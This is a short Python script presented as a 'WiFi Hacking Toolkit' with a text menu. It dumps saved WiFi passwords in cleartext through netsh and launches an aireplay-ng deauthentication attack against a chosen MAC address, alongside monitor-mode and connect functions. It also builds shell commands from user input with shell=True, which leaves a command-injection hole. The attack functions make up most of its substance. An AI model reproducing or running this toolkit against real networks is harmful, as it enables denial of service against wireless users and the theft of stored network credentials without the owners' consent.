import subprocess

# View WiFi networks
def list_wifi():
    subprocess.run("netsh wlan show networks", shell=True)

# Connect to WiFi
def connect_wifi(ssid, password):
    subprocess.run(f"netsh wlan connect name={ssid} key={password}", shell=True)

# Get saved WiFi passwords
def saved_wifi_passwords():
    subprocess.run("netsh wlan show profile * key=clear", shell=True)

# Deauth attack
def deauth_attack(interface, target):
    subprocess.run(f"aireplay-ng -0 10 -a {target} {interface}", shell=True)

# Monitor mode activation
def monitor_mode(interface):
    subprocess.run(f"airmon-ng start {interface}", shell=True)

def main():
    print("WiFi Hacking Toolkit")
    while True:
        print("\n1. List WiFi networks")
        print("2. Connect to a WiFi network")
        print("3. View saved WiFi passwords")
        print("4. Perform deauth attack")
        print("5. Activate monitor mode")
        print("6. Exit")
        choice = input("Enter your choice: ")
        if choice == "1":
            list_wifi()
        elif choice == "2":
            ssid = input("Enter SSID: ")
            password = input("Enter password: ")
            connect_wifi(ssid, password)
        elif choice == "3":
            saved_wifi_passwords()
        elif choice == "4":
            interface = input("Enter interface: ")
            target = input("Enter target MAC address: ")
            deauth_attack(interface, target)
        elif choice == "5":
            interface = input("Enter interface: ")
            monitor_mode(interface)
        elif choice == "6":
            break
        else:
            print("Invalid choice. Try again.")

if __name__ == "__main__":
    main()
